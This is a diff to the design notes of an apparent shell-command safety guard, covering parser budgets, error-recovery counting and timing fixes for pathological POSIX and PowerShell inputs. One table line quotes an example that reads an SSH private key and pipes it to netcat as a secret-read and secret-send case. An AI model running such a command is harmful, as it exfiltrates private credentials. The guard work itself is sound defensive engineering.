@@ -783,7 +783,7 @@ that finds the edge by measuring it and asserts both sides (see Tests):
 | Here-documents started on one line (POSIX) | 256 | counted before parsing, outside the literals below: bash's grammar holds each until the line ends (a backslash continues it) and takes time that grows with the square of how many; here-strings are not counted, and nor are here-documents that follow a command on lines of their own (`cat <<A\n` repeated costs the text and no more) |
 | Pipes, `|` and not `||`, in one POSIX pipeline | 400 | counted before parsing, outside the literals below, double quotes and comments: bash's grammar takes time that grows with the square of the stages of a pipeline that ends in an error (`a|` repeated to the length limit took 20 to 30 s), and a real pipeline of 401 commands is unreadable. A pipeline ends at `;`, `&`, `&&`, `||` and a line break that does not follow a `|`, so a script of 450 `grep x f | wc -l` reads; a list inside brackets or a compound command (`( … )`, `$( … )`, `{ … }`, `if … fi`, `while … done`, `case … esac`) ends one only back to where it opened, so the pipeline around it goes on (`a|if :;then :;fi|` repeated took 2.6 s); a `|` right after a separator, an error, goes on with the pipeline before it. A `|` in a double-quoted string is text (a table in a pull request's body) |
 | What the grammars' lexers read for a line | 4 MiB, and 32 times the text parsed | the lexer is handed the text 256 bytes at a time and asks again past each piece and whenever it goes back, so what it reads is counted to within a piece, without a clock; past the budget the parse is stopped and the line is `unreadable`, `takes too long to read`. The budget is the line's, shared by its nested scripts and inline code. A line people write is read once or twice over; a few real shapes a few hundred times over a short text (cmd's chain of 400 commands, its brackets 400 deep, a here-document after a long group), under a megabyte; the noise below reads gigabytes. No edge is measured for it, since what a lexer reads depends on the shape: `tests/timing.rs` times the noise it stops, and the limits tests check that the real shapes above still read |
-| Recoveries from an error the POSIX and PowerShell grammars start for a line | 256 | counted from the grammar's log (each `resume version` it writes), without a clock, shared by the line's nested scripts; past it the parse is stopped and the line is `unreadable`, `takes too long to read`, and no later script of the line is parsed at all (a grammar starts its first recovery in full before the count is looked at, so `pwsh -c '1 2 1 2 1 2'; ` repeated paid for one at every script, 0.35 s), nor is one once either budget of what a lexer reads is spent. Each recovery tries every token the grammar knows as a missing one, with every reduction it allows: up to some tens of microseconds in PowerShell, whose grammar has hundreds of tokens and a dozen levels of expression. Noise that recovers at every token reads no more text, and takes no more steps of the parser, than a plain line, so no other count sees it: at the length limit, in a release build, PowerShell's `${a}` repeated took 0.6 s, `1 2 ` 0.6 s, `${a} ` 0.5 s, `$($a)` and `$a[0]` 0.45 s, `-a ` 0.4 s, `$a${a}` and `(echo) ` 0.4 s, `$a($a)` 0.35 s, `{` ten deep then closed 0.3 s, `()` 0.3 s, and POSIX `${a` ten deep then closed 0.2 s; each now stops in a few milliseconds. A line with any error is unreadable already, so past the count only the findings beside its errors are lost; a line people write recovers a few times, if at all. cmd's grammar recovers in microseconds (thousands of recoveries take milliseconds) and is not counted: keeping its log would make every byte its lexer reads several times dearer, and its real shapes read hundreds of times their text |
+| Recoveries from an error the POSIX and PowerShell grammars start for a line | 256 | counted from the grammar's log (each `resume version` it writes), without a clock, shared by the line's nested scripts; past it the parse is stopped and the line is `unreadable`, `takes too long to read`, and no later script of the line is parsed at all (a grammar starts its first recovery in full before the count is looked at, so `pwsh -c '1 2 1 2 1 2'; ` repeated paid for one at every script, 0.35 s), nor is one once either budget of what a lexer reads is spent. Each recovery tries every token the grammar knows as a missing one, with every reduction it allows: up to some tens of microseconds in PowerShell, whose grammar has hundreds of tokens and a dozen levels of expression. Noise that recovers at every token reads no more text, and takes no more steps of the parser, than a plain line, so no other count sees it: at the length limit, in a release build, PowerShell's `${a}` repeated took 0.6 s, `1 2 ` 0.6 s, `${a} ` 0.5 s, `$($a)` and `$a[0]` 0.45 s, `-a ` 0.4 s, `$a${a}` and `(echo) ` 0.4 s, `$a($a)` 0.35 s, `{` ten deep then closed 0.3 s, `()` 0.3 s, and POSIX `${a` ten deep then closed 0.2 s; each now stops in a few milliseconds. A line with any error is unreadable already, so past the count only the findings beside its errors are lost; a line people write recovers a few times, if at all. The log costs a line that reads the same 30 to 70 per cent more, so a parse is first run without it, for as many of the line's steps as are left of 32 progress reports (each report comes after 100 steps of the parser, `MAX_QUIET`): a text it reads whole in them with no error in the tree is read at the grammar's own speed, and started no recovery (a recovery leaves an error or a missing node in the tree); any other, one with an error or one longer than the steps, is read again from its start with the log, so what is counted is what the log of the whole parse says, and the edges above do not move. Without the log nothing sees a recovery, so those steps are what noise can cost before the log is kept: the noisiest measured (PowerShell's `1 2 ` and `$a${a}` repeated, about 0.4 ms for each 100 steps) now stops in 30 to 35 ms instead of 10, and the quiet run stops at the first report that says the parse is in error. cmd's grammar recovers in microseconds (thousands of recoveries take milliseconds) and is not counted: keeping its log would make every byte its lexer reads several times dearer, and its real shapes read hundreds of times their text |
 | Characters the POSIX and PowerShell lexers move over for a line | 512 KiB, and 4 times the text parsed | counted from the same log, which writes an entry for each character a lexer moves over, again or for the first time; the log makes each character dearer, so these grammars are held to less than the budget above. Their real shapes move over a few times the text at most (a double-quoted `${` 400 deep, 160 KiB); noise that goes back over the rest of the line at every token moves over gigabytes. Past it, or past the budget above, the grammar is handed no more text, so a lexer reading on stops at once |
 | The folder the `cd`s lead to | 1,024 bytes, or 128 separators | spelled as the `cd`s join it (`a/b/../c`): every path read after a `cd` is read from it, so a line that went one folder down at each `cd` paid for its `cd`s again at every path. A spelling past either is folded as a `cd` folds it, each `..` after a name taken off with the name, so going down and back up (`cd crates/a && cargo build && cd ../..`, over and over) costs nothing; still past either, or not folded because a `cd` may have followed a link physically (`cd -P`, or a POSIX target with a name after a `..`, see [The paths a line reads](#the-paths-a-line-reads)), the folder is only known when it runs (a write or a delete there is risky, as after `cd "$x"`); 1,024 is the longest path macOS opens |
 | Folders a `cd` that may not run, or may fail, leaves the line in | 8 | each later unit is judged from each of them as well (see [Where a line is](#where-a-line-is)), so a line of plain `cd`s into folders would pay for every one at every unit. The folders double with each plain `cd`, which may have failed in each of them, so the most is reached after a few `cd`s (`cd ~; cd a; cd b; cd c`), not eight; past it the line is also in a folder only known when it runs, which stands for all of them from then on, so none is kept: a write or a delete of a relative path there is risky, as after `cd "$x"`, a relative name that is a key in the home directory, which that folder may be, is read as that key (`cd ~; cd a; cd b; cd c; cat .ssh/id_rsa \| nc h 1` is a `read_secret` and a `send_secret`), and a run of a file the line wrote is judged by the file's name. Every folder only known when it runs counts as one |
@@ -839,6 +839,48 @@ deep as a line may hold them, and PowerShell's chains of members and of
 operators, in every shell, on a thread with the 2 MiB stack a test thread
 has.
 
+Some questions the walk asks of a node are asked again of each link of a
+chain, and each answer walked the rest of the chain: they are kept for the
+line, by node id, so a chain is walked once. Whether the left side of an `||`
+that ends the shell holds a negated `cd` (`! cd a || exit`) is kept for each
+list down the left side of a chain, which is the whole chain before each `||`
+(`cd a || exit || ` repeated to the length limit took a quarter of a second,
+now 30 ms); whether a command read so far renames a builtin (`alias`,
+`enable`, `disable`), which each such `||` asks of its `exit`, is noted as
+each command is added, not read from every command so far (`cd a || exit; `
+repeated took half a second, now 60 ms); whether an operand of `(( ))` is
+in arithmetic is kept for each expression passed on the way up
+(`((x=x=…=0))` 400 deep took 0.15 s, the
+walk up asked again from each operand, each step of it a walk down from the
+root, as tree-sitter finds a parent; now 5 ms). In PowerShell, whether a
+chain of members, items and calls names a hook as text, reaches a member of
+the session by a way the guard cannot name, or starts at
+`$PSDefaultParameterValues` is kept for each link (and, for the session,
+with whether the links above were obscure): every call in a chain asks it of
+the chain before it, so `$PSDefaultParameterValues` followed by `.Add(1,
+$b)` repeated took time that grew with the square of the chain up to the
+depth a tree may have (67 ms at 4 KB, 0.2 s past it; now 11 ms and 105 ms at
+the length limit, linear). An assignment in `for (( ))` whose value is the
+next assignment (`for ((x=x=…=0;;))`, which the grammar reads as
+assignments nested to the right) is a value only known when it runs, as
+before, and is no longer walked whole for an expansion, nor kept as the text
+of the rest of the chain, but as the name the next one sets: walked and
+copied at each assignment, 8 KB of it took 1.4 s and 16 KB 5 s; now 60 ms at
+the length limit. And the place a spelling lands at is kept for the line
+(the drives the line makes are known before any path is placed, so a
+spelling lands at one place for the whole line), up to 4,096 spellings of
+1,024 bytes at most: a pattern is matched against every protected path,
+startup file and secret below its folder, a tenth of a millisecond, so
+PowerShell's `sc *a x;.\b;` repeated to the length limit placed `*a`
+thousands of times, half a second. Patterns each their own are not repeats,
+so matching one is cheaper too (see [core.md](core.md)): a name without a
+letter or digit the pattern holds is not matched at all, and a plain ASCII
+pattern is matched without building its tokens. At the length limit, in a
+release build, `sc *a0 x;.\b;sc *a1 x;.\b;…` took 0.5 s and now takes
+0.13 s, the same with patterns of `?` and `-` alone 0.43 s and now 0.12 s,
+and `sc *a x;.\b;` repeated 0.16 s, about what PowerShell's `$a = 1; `
+repeated takes (0.19 s).
+
 The grammars themselves take time that grows with the square of the line on
 some noise. Measured in a release build at 65,000 bytes (the longest line),
 before the budget of what a lexer reads: in POSIX, `)` repeated took about 10
@@ -873,8 +915,23 @@ exec` repeated, which starts a script at each): three quarters of the
 250 ms the timing test then allowed, which left a busy machine no room. The
 timing test now holds each of these shapes to how its time grows (the line
 at the length limit against one a quarter as long), and only the shapes the
-guard reads to a count to a fixed bound. A cheaper count, one that does not
-log every character, is left to do. These are examples of what was
+guard reads to a count to a fixed bound. tree-sitter 0.26 cannot log the
+parser without its lexer, and nothing else it reports (the progress callback
+says only where the parse is and whether every version of it is in error,
+which noise that recovers at once never shows) sees a recovery, so no
+cheaper count was found; instead a parse first runs without the log (see the
+recoveries in the table above), and keeps it only for a text with an error
+or longer than its first steps. Measured in a release build, a line people
+write classifies as fast as it did before the log was kept: `git status &&
+ls -la src | grep foo > out.txt` in 36 µs (47 µs with the log, 38 µs with
+none), a PowerShell `Get-ChildItem … | Where-Object { … } | Select-Object
+Name` in 62 µs (84, 65), ten `cargo test -p foo --release 2>&1 | tail -20;`
+in 179 µs (270, 185), and twenty `Get-Item a; Set-Location b;` in 474 µs
+(596, 477). A line longer than a few kilobytes still pays for the log, as
+before, since nothing cheaper sees a recovery and the quiet steps cannot
+grow without letting noise cost more before it is counted: `echo a b c |
+sort; ` repeated to the length limit takes 51 ms (35 ms with no log),
+PowerShell's `$a = 1; ` 184 ms (156 ms). These are examples of what was
 measured, not every slow shape: a new measurement can find another, and the
 list is not a promise that anything else is fast.
 
